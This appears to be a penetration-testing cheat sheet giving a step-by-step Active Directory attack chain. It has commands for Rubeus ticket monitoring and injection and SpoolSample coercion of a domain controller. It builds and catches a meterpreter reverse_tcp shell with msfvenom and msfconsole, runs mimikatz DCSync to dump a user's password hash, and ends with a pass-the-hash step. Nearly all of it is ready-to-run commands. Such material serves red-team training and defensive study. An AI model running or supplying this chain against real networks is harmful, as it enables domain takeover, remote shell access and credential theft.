> Run Rubeus on our administrator shell:

```
.\Rubeus.exe monitor /interval:5 /filteruser:<dc_computername>$
```

> Now we need a shell in order to migrate to SYSTEM to run SpoolSample or if we have a SYSTEM shell we can skip this part:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=<port> -f exe -o payload.exe
```

> Start Listener:

```
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <kali_ip>; set lport <port>; run"
```

> Once we have a shell as administrator run PS in meterpreter and then migrate to a SYSTEM process. Then transfer over SpoolSample and run it:

```
SpoolSample.exe <dc_computername> <current_computername>
```

> On our Rubeus session we will grab a TGT which we can inject. Make sure the ticket has no line breaks or it will fail:

```
.\Rubeus.exe ptt /ticket:<ticket>
```

> Once this is done we can run mimikatz and then obtain the hash of our select user:

```
privilege::debug
lsadump::dcsync /domain:<domain> /user:<user>
```

Once we have the hash we can pass it or use it with evil-winrm or psexec.